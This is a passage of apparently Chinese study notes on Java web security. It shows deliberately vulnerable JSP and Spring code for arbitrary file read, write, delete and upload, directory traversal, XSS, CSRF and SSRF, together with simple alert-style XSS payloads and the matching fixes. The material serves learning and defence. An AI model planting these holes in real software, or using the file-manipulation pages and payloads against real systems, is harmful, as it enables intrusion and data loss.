import&#x3D;&quot;java.io.IOException&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.nio.file.Files&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.nio.file.Paths&quot; %&gt;\n&lt;pre&gt;\n&lt;%\n    try &#123;\n        byte[] bytes &#x3D; Files.readAllBytes(Paths.get(request.getParameter(&quot;file&quot;)));\n        out.println(new String(bytes));\n    &#125; catch (IOException e) &#123;\n        e.printStackTrace();\n    &#125;\n%&gt;\n&lt;&#x2F;pre&gt;\n\n文件写入：https://javasec.org/java-vuls/FileSystem.html#2-%E5%86%99%E6%96%87%E4%BB%B6\nsec的漏洞代码，是用jsp写的\n&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.io.File&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.io.FileOutputStream&quot; %&gt;\n\n&lt;%\n    File file &#x3D; new File(request.getParameter(&quot;f&quot;));\n    FileOutputStream fos &#x3D; new FileOutputStream(file);\n    fos.write(request.getParameter(&quot;c&quot;).getBytes());\n    fos.flush();\n    fos.close();\n\n    out.println(file.getAbsoluteFile() + &quot;\\t&quot; + file.exists());\n%&gt;\n\nf是文件路径，c是文件内容。没有任何过滤限制导致任意文件写入\n可以跨目录写入，也可以通过绝对路径写入\n任意文件删除：https://javasec.org/java-vuls/FileSystem.html#3-%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6\n&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.io.File&quot; %&gt;\n&lt;%\n    File file &#x3D; new File(request.getParameter(&quot;file&quot;));\n    out.println(file.delete());\n%&gt;\n\n利用反射删除文件\n&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.io.File&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.lang.reflect.Method&quot; %&gt;\n\n&lt;%\n    String file &#x3D; request.getParameter(&quot;file&quot;);\n\n    Method m &#x3D; Class.forName(&quot;java.io.DefaultFileSystem&quot;).getMethod(&quot;getFileSystem&quot;);\n    m.setAccessible(true);\n    Object fs &#x3D; m.invoke(null);\n\n    Method m2 &#x3D; fs.getClass().getMethod(&quot;delete&quot;, File.class);\n    m2.setAccessible(true);\n    out.print(m2.invoke(fs, new File(file)));\n%&gt;\n\n任意文件复制/移动：https://javasec.org/java-vuls/FileSystem.html#4-%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E5%A4%8D%E5%88%B6%E3%80%81%E7%A7%BB%E5%8A%A8\n结合上传等进行利用\n&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.io.IOException&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.nio.file.Files&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.nio.file.Path&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.nio.file.Paths&quot; %&gt;\n&lt;pre&gt;\n&lt;%\n    try &#123;\n        Path path &#x3D; Files.copy(Paths.get(request.getParameter(&quot;source&quot;)), Paths.get(request.getParameter(&quot;dest&quot;)));\n\n        out.println(path);\n    &#125; catch (IOException e) &#123;\n        e.printStackTrace();\n    &#125;\n%&gt;\n&lt;&#x2F;pre&gt;\n\n重命名文件：https://javasec.org/java-vuls/FileSystem.html#5-%E9%87%8D%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6\n&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.io.File&quot; %&gt;\n&lt;%\n    String fileName1 &#x3D; request.getParameter(&quot;s&quot;);\n    String fileName2 &#x3D; request.getParameter(&quot;d&quot;);\n\n    File f &#x3D; new File(fileName1);\n    File d &#x3D; new File(fileName2);\n\n    f.renameTo(d);\n\n    out.println(d + &quot;\\t&quot; + d.exists());\n%&gt;\n\n还是结合上传\n文件目录遍历：https://javasec.org/java-vuls/FileSystem.html#6-%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86\n&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.io.File&quot; %&gt;\n\n&lt;pre&gt;\n&lt;%\n    String[] files &#x3D; new File(request.getParameter(&quot;dir&quot;)).list();\n\n    for (String file : files) &#123;\n        out.println(file);\n    &#125;\n%&gt;\n&lt;&#x2F;pre&gt;\n\n这个代码只能列出路径目录，有时候不仅能列出还能够访问或下载\n修复：关于文件访问类的修复，就和前面的任意文件读取修复差不多。限制访问路径，设置黑白名单，做好过滤。\nJavasec关于目录遍历的修复例子：\nhttps://javasec.org/java-vuls/FileSystem.html#8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D\n&lt;%@ page import&#x3D;&quot;java.io.File&quot; %&gt;&lt;%--\n  Created by IntelliJ IDEA.\n  User: yz\n  Date: 2019&#x2F;12&#x2F;4\n  Time: 6:08 下午\n  To change this template use File | Settings | File Templates.\n--%&gt;\n&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\n&lt;%!\n    &#x2F;&#x2F; 定义限制用户遍历的文件目录常量\n    private static final String IMAGE_DIR &#x3D; &quot;&#x2F;data&#x2F;images&#x2F;&quot;;\n%&gt;\n&lt;%\n    &#x2F;&#x2F; 定义需要遍历的目录\n    String dirStr &#x3D; request.getParameter(&quot;dir&quot;);\n\n    if (dirStr !&#x3D; null) &#123;\n        File dir &#x3D; new File(dirStr);\n\n        &#x2F;&#x2F; 获取文件绝对路径，转换成标准的文件路径\n        String fileDir &#x3D; (dir.getAbsoluteFile().getCanonicalFile() + &quot;&#x2F;&quot;).replace(&quot;\\\\\\\\&quot;, &quot;&#x2F;&quot;).replaceAll(&quot;&#x2F;+&quot;, &quot;&#x2F;&quot;);\n        out.println(&quot;&lt;h3&gt;&quot; + fileDir + &quot;&lt;&#x2F;h3&gt;&quot;);\n\n        &#x2F;&#x2F; 检查当前用户传入的目录是否包含在系统限定的目录下\n        if (fileDir.startsWith(IMAGE_DIR)) &#123;\n            File[] dirs &#x3D; dir.listFiles();\n\n            out.println(&quot;&lt;pre&gt;&quot;);\n\n            for (File file : dirs) &#123;\n                out.println(file.getName());\n            &#125;\n\n            out.println(&quot;&lt;&#x2F;pre&gt;&quot;);\n        &#125; else &#123;\n            out.println(&quot;目录不合法!&quot;);\n        &#125;\n    &#125;\n\n%&gt;\n\n这就是典型的白名单\n同时还需要注意常见的漏洞利用手法，关于%00截断的修复\n&#x2F;**\n * 检查文件名中是否包含了空字节，禁止出现%00字符截断\n *\n * @param file 访问文件\n * @return 是否包含空字节\n *&#x2F;\nprivate static boolean nullByteValid(File file) &#123;\n   return file.getName().indexOf(&#39;\\u0000&#39;) &lt; 1;\n&#125;\n\n文件上传漏洞：任意文件上传：漏洞代码：\n@GetMapping(&quot;&#x2F;any&quot;)\n    public String index() &#123;\n        return &quot;upload&quot;; &#x2F;&#x2F; return upload.html page\n    &#125;\n\n上传表单：\n&lt;!DOCTYPE html&gt;\n&lt;html xmlns:th&#x3D;&quot;http:&#x2F;&#x2F;www.thymeleaf.org&quot;&gt;\n&lt;body&gt;\n\n&lt;h3&gt;file upload&lt;&#x2F;h3&gt;\n\n&lt;form method&#x3D;&quot;POST&quot; th:action&#x3D;&quot;upload&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;\n    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;\n    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot; &#x2F;&gt;\n&lt;&#x2F;form&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n\nupload方法：\n@PostMapping(&quot;&#x2F;upload&quot;)\n   public String singleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file,\n                                  RedirectAttributes redirectAttributes) &#123;\n       if (file.isEmpty()) &#123;\n           &#x2F;&#x2F; 赋值给uploadStatus.html里的动态参数message\n           redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;Please select a file to upload&quot;);\n           return &quot;redirect:&#x2F;file&#x2F;status&quot;;\n       &#125;\n\n       try &#123;\n           &#x2F;&#x2F; Get the file and save it somewhere\n           byte[] bytes &#x3D; file.getBytes();\n           Path path &#x3D; Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());\n           Files.write(path, bytes);\n\n           redirectAttributes.addFlashAttribute(&quot;message&quot;,\n                   &quot;You successfully uploaded &#39;&quot; + UPLOADED_FOLDER + file.getOriginalFilename() + &quot;&#39;&quot;);\n\n       &#125; catch (IOException e) &#123;\n           redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;upload failed&quot;);\n           logger.error(e.toString());\n       &#125;\n\n       return &quot;redirect:&#x2F;file&#x2F;status&quot;;\n   &#125;\n\n后面调用的方法就不列出来了，就是显示上传成功的信息。\n这就是个典型的任意文件上传漏洞\nJavasec文件上传描述：https://javasec.org/java-vuls/FileUpload.html#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E\n感觉有点搞开发的意思了，也是。就是弄RASP的。\n修复：白名单，黑名单，文件头，MIME，防止截断，路径写死，严格控制执行权限等。\n   @PostMapping(&quot;&#x2F;upload&#x2F;picture&quot;)\n    @ResponseBody\n    public String uploadPicture(@RequestParam(&quot;file&quot;) MultipartFile multifile) throws Exception &#123;\n        &#x2F;&#x2F;MultipartFile是spring类型，\n        if (multifile.isEmpty()) &#123;\n            return &quot;Please select a file to upload&quot;;\n        &#125;\n\n        String fileName &#x3D; multifile.getOriginalFilename();&#x2F;&#x2F;得到上传的文件名，\n        String Suffix &#x3D; fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); &#x2F;&#x2F; 获取文件后缀名\n        String mimeType &#x3D; multifile.getContentType(); &#x2F;&#x2F; 获取MIME类型\n        &#x2F;&#x2F;String filePath &#x3D; falpath(multifile); &#x2F;&#x2F;D:&#x2F;tmp&#x2F;pic&#x2F;xxxx\n\n\n\n        &#x2F;&#x2F; 判断文件后缀名是否在白名单内  校验1\n        String[] picSuffixList &#x3D; &#123;&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;&#125;;\n        boolean suffixFlag &#x3D; false;\n        for (String white_suffix : picSuffixList) &#123;\n            if (Suffix.toLowerCase().equals(white_suffix)) &#123;\n                suffixFlag &#x3D; true;\n                break;\n            &#125;\n        &#125;\n        if (!suffixFlag) &#123;\n            logger.error(&quot;[-] Suffix error: &quot; + Suffix);\n            &#x2F;&#x2F;deleteFile(filePath);\n            return &quot;Upload failed. Illeagl picture.&quot;;\n        &#125;\n\n\n        &#x2F;&#x2F; 判断MIME类型是否在黑名单内 校验2\n        String[] mimeTypeBlackList &#x3D; &#123;\n                &quot;text&#x2F;html&quot;,\n                &quot;text&#x2F;javascript&quot;,\n                &quot;application&#x2F;javascript&quot;,\n                &quot;application&#x2F;ecmascript&quot;,\n                &quot;text&#x2F;xml&quot;,\n                &quot;application&#x2F;xml&quot;\n        &#125;;\n        for (String blackMimeType : mimeTypeBlackList) &#123;\n            &#x2F;&#x2F; 用contains是为了防止text&#x2F;html;charset&#x3D;UTF-8绕过\n            if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123;\n                logger.error(&quot;[-] Mime type error: &quot; + mimeType);\n                &#x2F;&#x2F;deleteFile(filePath);\n                return &quot;Upload failed. Illeagl picture.&quot;;\n            &#125;\n        &#125;\n\n        File excelFile &#x3D; convert(multifile);&#x2F;&#x2F;文件名字做了uuid处理\n        String filePath &#x3D; excelFile.getPath();\n        &#x2F;&#x2F; 判断文件内容是否是图片 校验3\n        boolean isImageFlag &#x3D; isImage(excelFile);\n        if (!isImageFlag) &#123;\n            logger.error(&quot;[-] File is not Image&quot;);\n            deleteFile(filePath);\n            return &quot;Upload failed. Illeagl picture.&quot;;\n        &#125;\n\n\n&#x2F;*\n        try &#123;\n            &#x2F;&#x2F; Get the file and save it somewhere\n            byte[] bytes &#x3D; multifile.getBytes();\n            &#x2F;&#x2F;Path path &#x3D; Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());\n            &#x2F;&#x2F;Path path &#x3D; Paths.get(UPLOADED_FOLDER + falpath(multifile));\n            Path path &#x3D; excelFile.toPath();&#x2F;&#x2F;..&#x2F;目录穿越的过滤掉了，进行了从命名的操作\n            Files.write(path, bytes);\n        &#125; catch (IOException e) &#123;\n            logger.error(e.toString());\n            deleteFile(filePath);\n            return &quot;Upload failed&quot;;\n        &#125;\n*&#x2F;\n\n        logger.info(&quot;[+] Safe file. Suffix: &#123;&#125;, MIME: &#123;&#125;&quot;, Suffix, mimeType);\n        logger.info(&quot;[+] Successfully uploaded &#123;&#125;&quot;, filePath);\n        return String.format(&quot;You successfully uploaded &#39;%s&#39;&quot;, filePath);\n    &#125;\n\n验证文件内容，使用uuid生成随机文件名\n\nprivate String falpath (MultipartFile multiFile)throws Exception &#123;\n    String fileName &#x3D; multiFile.getOriginalFilename();\n    String suffix &#x3D; fileName.substring(fileName.lastIndexOf(&quot;.&quot;));\n    UUID uuid &#x3D; Generators.timeBasedGenerator().generate();\n    randomFilePath &#x3D; UPLOADED_FOLDER + uuid + suffix;\n    return  randomFilePath;\n\n\n&#125;\n\n\n&#x2F;**\n * 为了使用ImageIO.read()\n *\n * 不建议使用transferTo，因为原始的MultipartFile会被覆盖\n * https:&#x2F;&#x2F;stackoverflow.com&#x2F;questions&#x2F;24339990&#x2F;how-to-convert-a-multipart-file-to-file\n *&#x2F;\nprivate File convert(MultipartFile multiFile) throws Exception &#123;\n    String fileName &#x3D; multiFile.getOriginalFilename();\n    String suffix &#x3D; fileName.substring(fileName.lastIndexOf(&quot;.&quot;));\n    UUID uuid &#x3D; Generators.timeBasedGenerator().generate();\n    randomFilePath &#x3D; UPLOADED_FOLDER + uuid + suffix;\n    &#x2F;&#x2F; 随机生成一个同后缀名的文件\n    File convFile &#x3D; new File(randomFilePath);\n    boolean ret &#x3D; convFile.createNewFile();\n    if (!ret) &#123;\n        return null;\n    &#125;\n    FileOutputStream fos &#x3D; new FileOutputStream(convFile);\n    fos.write(multiFile.getBytes());\n    fos.close();\n    return convFile;\n&#125;\n\n&#x2F;**\n * Check if the file is a picture.\n *&#x2F;\nprivate static boolean isImage(File file) throws IOException &#123;\n    BufferedImage bi &#x3D; ImageIO.read(file);\n    return bi !&#x3D; null;\n&#125;\n\nxss：反射性：漏洞代码：\n@RequestMapping(&quot;&#x2F;reflect&quot;)\n    @ResponseBody\n    public static String reflect(String xss) &#123;\n        return xss;\n    &#125;\n\n直接输出到页面，访问：http://localhost:8080/xss/reflect?xss=%3Cscript%3Ealert(1)%3C/script%3E\n即可弹窗\nJavasec：\n&lt;%&#x3D;request.getParameter(&quot;input&quot;)%&gt;\n\n存储型：漏洞代码：\n@RequestMapping(&quot;&#x2F;stored&#x2F;store&quot;)\n    @ResponseBody\n    public String store(String xss, HttpServletResponse response) &#123;\n        &#x2F;&#x2F;String en_xss &#x3D; encode(xss);\n        Cookie cookie &#x3D; new Cookie(&quot;xss&quot;, en_xss);\n        response.addCookie(cookie);\n        return &quot;Set param into cookie&quot;;\n    &#125;\n\n这里通过添加到cookie来存储xss代码，是为了方便演示，实际情况一般是添加到数据库里面。\n访问：http://localhost:8080/xss/stored/store?xss=%3Cscript%3Ealert(1)%3C/script%3E\n设置xss cookie值，接着访问show方法：http://localhost:8080/xss/stored/show\n即可弹窗\nJavasec：\n&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.text.SimpleDateFormat&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.util.*&quot; %&gt;\n&lt;%\n    String username &#x3D; request.getParameter(&quot;username&quot;);\n    String content &#x3D; request.getParameter(&quot;content&quot;);\n\n    String guestBookKey &#x3D; &quot;GUEST_BOOK&quot;;\n    List&lt;Map&lt;String, String&gt;&gt; comments &#x3D; new ArrayList&lt;Map&lt;String, String&gt;&gt;();\n\n    if (content !&#x3D; null) &#123;\n        Object obj &#x3D; application.getAttribute(guestBookKey);\n\n        if (obj !&#x3D; null) &#123;\n            comments &#x3D; (List&lt;Map&lt;String, String&gt;&gt;) obj;\n        &#125;\n\n        Map&lt;String, String&gt; comment &#x3D; new HashMap&lt;String, String&gt;();\n        String              ip      &#x3D; request.getHeader(&quot;x-real-ip&quot;);\n\n        if (ip &#x3D;&#x3D; null) &#123;\n            ip &#x3D; request.getRemoteAddr();\n        &#125;\n\n        comment.put(&quot;username&quot;, username);\n        comment.put(&quot;content&quot;, content);\n        comment.put(&quot;ip&quot;, ip);\n        comment.put(&quot;date&quot;, new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;).format(new Date()));\n\n        comments.add(comment);\n\n        application.setAttribute(guestBookKey, comments);\n    &#125;\n%&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;留言板&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;style&gt;\n    * &#123;\n        margin: 0;\n        padding: 0;\n    &#125;\n&lt;&#x2F;style&gt;\n&lt;body&gt;\n&lt;div style&#x3D;&quot;border: 1px solid #C6C6C6;&quot;&gt;\n    &lt;div style&#x3D;&quot;text-align: center;&quot;&gt;\n        &lt;h2&gt;在线留言板&lt;&#x2F;h2&gt;\n    &lt;&#x2F;div&gt;\n    &lt;div&gt;\n        &lt;dl&gt;\n            &lt;%\n                Object obj &#x3D; application.getAttribute(guestBookKey);\n\n                if (obj instanceof List) &#123;\n                    comments &#x3D; (List&lt;Map&lt;String, String&gt;&gt;) obj;\n\n                    for (Map&lt;String, String&gt; comment : comments) &#123;\n            %&gt;\n            &lt;dd&gt;\n                &lt;div style&#x3D;&quot;min-height: 50px; margin: 20px; border-bottom: 1px solid #9F9F9F;&quot;&gt;\n                    &lt;p&gt;&lt;B&gt;&lt;%&#x3D;comment.get(&quot;username&quot;)%&gt;\n                    &lt;&#x2F;B&gt;[&lt;%&#x3D;comment.get(&quot;ip&quot;)%&gt;] 于 &lt;%&#x3D;comment.get(&quot;date&quot;)%&gt; 发表回复：&lt;&#x2F;p&gt;\n                    &lt;p style&#x3D;&quot;margin: 15px 0 5px 0; font-size: 12px;&quot;&gt;\n                    &lt;pre&gt;&lt;%&#x3D;comment.get(&quot;content&quot;)%&gt;&lt;&#x2F;pre&gt;\n                    &lt;&#x2F;p&gt;\n                &lt;&#x2F;div&gt;\n            &lt;&#x2F;dd&gt;\n            &lt;%\n                    &#125;\n                &#125;\n            %&gt;\n        &lt;&#x2F;dl&gt;\n    &lt;&#x2F;div&gt;\n    &lt;div style&#x3D;&quot;background-color: #fff; border: 1px solid #C6C6C6;&quot;&gt;\n        &lt;form action&#x3D;&quot;#&quot; method&#x3D;&quot;POST&quot; style&#x3D;&quot;margin: 20px;&quot;&gt;\n            昵称: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; style&#x3D;&quot;width:250px; height: 28px;&quot;&#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;\n            &lt;textarea name&#x3D;&quot;content&quot; style&#x3D;&quot;overflow: auto;width: 100%; height: 250px;&quot;&gt;&lt;&#x2F;textarea&gt;\n            &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交留言&quot; style&#x3D;&quot;margin-top: 20px; width: 80px; height: 30px;&quot;&#x2F;&gt;\n        &lt;&#x2F;form&gt;\n    &lt;&#x2F;div&gt;\n&lt;&#x2F;div&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n写了一个留言板页面，提交留言，刷新页面即可弹窗\nDOM型：这种类型我用漏扫扫描出来的最多。但是，老实说，我以前压根不知道这种怎么利用。\n原理这篇简短实用：https://blog.csdn.net/weixin_42299862/article/details/111302174\nJavasec：\n&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\nDate: &lt;span style&#x3D;&quot;color: red;&quot;&gt;&lt;&#x2F;span&gt;\n&lt;input type&#x3D;&quot;hidden&quot; value&#x3D;&quot;&lt;%&#x3D;request.getParameter(&quot;date&quot;)%&gt;&quot; &#x2F;&gt;\n&lt;script&gt;\n    var date &#x3D; document.getElementsByTagName(&quot;input&quot;)[0].value;\n    document.getElementsByTagName(&quot;span&quot;)[0].innerHTML &#x3D; date;\n&lt;&#x2F;script&gt;\n\n正常是data输入时间，页面输出时间。当data为img标签就会弹窗：\ndata=&lt;**mg src=1 onerror=alert(/xss/) */*&gt;\n修复：xss的修复，意见都一致，就是过滤相应的符号标签。实现类似于php的htmlspecialchars函数的功能。\n@RequestMapping(&quot;&#x2F;safe&quot;)\n    @ResponseBody\n    public static String safe(String xss) &#123;\n        return encode(xss);\n    &#125;\n\n    private static String encode(String origin) &#123;\n     &#x2F;*   origin &#x3D; StringUtils.replace(origin, &quot;&amp;&quot;, &quot;&amp;&quot;);\n        origin &#x3D; StringUtils.replace(origin, &quot;&lt;&quot;, &quot;&lt;&quot;);\n        origin &#x3D; StringUtils.replace(origin, &quot;&gt;&quot;, &quot;&gt;&quot;);\n        origin &#x3D; StringUtils.replace(origin, &quot;\\&quot;&quot;, &quot;&quot;&quot;);\n        origin &#x3D; StringUtils.replace(origin, &quot;&#39;&quot;, &quot;&amp;#x27;&quot;);\n        origin &#x3D; StringUtils.replace(origin, &quot;&#x2F;&quot;, &quot;&#x2F;&quot;);*&#x2F;\n        origin &#x3D; StringUtils.replace(origin, &quot;&amp;&quot;, &quot;＆&quot;);\n        origin &#x3D; StringUtils.replace(origin, &quot;&lt;&quot;, &quot;＜&quot;);\n        origin &#x3D; StringUtils.replace(origin, &quot;&gt;&quot;, &quot;＞&quot;);\n        origin &#x3D; StringUtils.replace(origin, &quot;\\&quot;&quot;, &quot;＼&quot;);\n        origin &#x3D; StringUtils.replace(origin, &quot;&#39;&quot;, &quot;＇&quot;);\n        origin &#x3D; StringUtils.replace(origin, &quot;&#x2F;&quot;, &quot;／&quot;);\n        return origin;\n    &#125;\n&#125;\n\n这是视频作者的两种过滤方式，一种将符号转化为html实体字符，一种将英文标签转化为中文标签。\nJavasec修复：\n&#x2F;**\n * 实现htmlSpecialChars函数把一些预定义的字符转换为HTML实体编码\n *\n * @param content 输入的字符串内容\n * @return HTML实体化转义后的字符串\n *&#x2F;\npublic static String htmlSpecialChars(String content) &#123;\n  if (content &#x3D;&#x3D; null) &#123;\n    return null;\n  &#125;\n\n  char[]        charArray &#x3D; content.toCharArray();\n  StringBuilder sb        &#x3D; new StringBuilder();\n\n  for (char c : charArray) &#123;\n    switch (c) &#123;\n      case &#39;&amp;&#39;:\n        sb.append(&quot;&amp;&quot;);\n        break;\n      case &#39;&quot;&#39;:\n        sb.append(&quot;&quot;&quot;);\n        break;\n      case &#39;\\&#39;&#39;:\n        sb.append(&quot;&amp;#039;&quot;);\n        break;\n      case &#39;&lt;&#39;:\n        sb.append(&quot;&lt;&quot;);\n        break;\n      case &#39;&gt;&#39;:\n        sb.append(&quot;&gt;&quot;);\n        break;\n      default:\n        sb.append(c);\n        break;\n    &#125;\n  &#125;\n\n  return sb.toString();\n&#125;\n\n就是换成html实体标签。\n还有就是全局过滤器的设置，Javasec全局过滤器：\npackage com.anbai.sec.vuls.filter;\n\nimport javax.servlet.*;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletRequestWrapper;\nimport java.io.IOException;\n\npublic class XSSFilter implements Filter &#123;\n\n    @Override\n    public void init(FilterConfig filterConfig) &#123;\n\n    &#125;\n\n    @Override\n    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException &#123;\n        HttpServletRequest request &#x3D; (HttpServletRequest) req;\n\n        &#x2F;&#x2F; 创建HttpServletRequestWrapper，包装原HttpServletRequest对象，示例程序只重写了getParameter方法，\n        &#x2F;&#x2F; 应当考虑如何过滤：getParameter、getParameterValues、getParameterMap、getInputStream、getReader\n        HttpServletRequestWrapper requestWrapper &#x3D; new HttpServletRequestWrapper(request) &#123;\n            public String getParameter(String name) &#123;\n                &#x2F;&#x2F; 获取参数值\n                String value &#x3D; super.getParameter(name);\n\n                &#x2F;&#x2F; 简单转义参数值中的特殊字符\n                return value.replace(&quot;&amp;&quot;, &quot;&amp;&quot;).replace(&quot;&lt;&quot;, &quot;&lt;&quot;).replace(&quot;&#39;&quot;, &quot;&amp;#039;&quot;);\n            &#125;\n        &#125;;\n\n        chain.doFilter(requestWrapper, resp);\n    &#125;\n\n    @Override\n    public void destroy() &#123;\n\n    &#125;\n\n&#125;\n\nweb.xml配置：\n&lt;!-- XSS过滤器 --&gt;\n&lt;filter&gt;\n  &lt;filter-name&gt;XSSFilter&lt;&#x2F;filter-name&gt;\n  &lt;filter-class&gt;com.anbai.sec.vuls.filter.XSSFilter&lt;&#x2F;filter-class&gt;\n&lt;&#x2F;filter&gt;\n\n&lt;filter-mapping&gt;\n  &lt;filter-name&gt;XSSFilter&lt;&#x2F;filter-name&gt;\n  &lt;url-pattern&gt;&#x2F;*&lt;&#x2F;url-pattern&gt;\n&lt;&#x2F;filter-mapping&gt;\n\ncsrf：跨站请求伪造，修复方法就是添加token值。\n这个只有安全的代码：\n@Controller\n    @RequestMapping(&quot;&#x2F;csrf&quot;)\n    public class CSRF &#123;\n\n        @GetMapping(&quot;&#x2F;&quot;)\n        public String index() &#123;\n            return &quot;form&quot;;\n        &#125;\n\n        @PostMapping(&quot;&#x2F;post&quot;)\n        @ResponseBody\n        public String post() &#123;\n            return &quot;CSRF passed.&quot;;\n        &#125;\n    &#125;\n\nform.html：\n\n&lt;html xmlns:th&#x3D;&quot;http:&#x2F;&#x2F;www.thymeleaf.org&quot; lang&#x3D;&quot;en&quot;&gt;\n&lt;head&gt;\n    &lt;script th:src&#x3D;&quot;@&#123;https:&#x2F;&#x2F;code.jquery.com&#x2F;jquery-3.4.1.min.js&#125;&quot;&gt;&lt;&#x2F;script&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;div&gt;\n    &lt;!-- th:action with Spring 3.2+ and Thymeleaf 2.1+ can automatically force Thymeleaf to include the CSRF token as a hidden field --&gt;\n    &lt;!-- &lt;form name&#x3D;&quot;f&quot; th:action&#x3D;&quot;@&#123;&#x2F;csrf&#x2F;post&#125;&quot; method&#x3D;&quot;post&quot;&gt; --&gt;\n    &lt;form name&#x3D;&quot;f&quot; action&#x3D;&quot;&#x2F;csrf&#x2F;post&quot; method&#x3D;&quot;post&quot;&gt;\n        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;input&quot; &#x2F;&gt;\n        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot; &#x2F;&gt;\n        &lt;input type&#x3D;&quot;hidden&quot; th:name&#x3D;&quot;$&#123;_csrf.parameterName&#125;&quot; th:value&#x3D;&quot;$&#123;_csrf.token&#125;&quot; &#x2F;&gt;\n    &lt;&#x2F;form&gt;\n&lt;&#x2F;div&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n最关键的就是那个hidden的input标签，生成了token值，并且自动验证。这个方法是带框架的csrf防御方法。不使用框架那就要在后端生成token。\n当正常登录访问，提交表单会自动验证token值，正确则进入post方法，错误则返回csrftoken验证错误。\nssrf：服务端请求伪造\nJava支持的几种常见协议：\nfile、ftp、http、https、jar、mailto、netdoc\n\n漏洞代码：\n@RequestMapping(value &#x3D; &quot;&#x2F;urlConnection&#x2F;vuln&quot;, method &#x3D; &#123;RequestMethod.POST, RequestMethod.GET&#125;)\n    public String URLConnectionVuln(String url) &#123;\n        return HttpUtils.URLConnection(url);\n    &#125;\n\nURLConnect方法：\npublic static String URLConnection(String url) &#123;\n       try &#123;\n           URL u &#x3D; new URL(url);\n           URLConnection urlConnection &#x3D; u.openConnection();\n           BufferedReader in &#x3D; new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); &#x2F;&#x2F;send request\n           &#x2F;&#x2F; BufferedReader in &#x3D; new BufferedReader(new InputStreamReader(u.openConnection().getInputStream()));\n           String inputLine;\n           StringBuilder html &#x3D; new StringBuilder();\n\n           while ((inputLine &#x3D; in.readLine()) !&#x3D; null) &#123;\n               html.append(inputLine);\n           &#125;\n           in.close();\n           return html.toString();\n       &#125; catch (Exception e) &#123;\n           logger.error(e.getMessage());\n           return e.getMessage();\n       &#125;\n   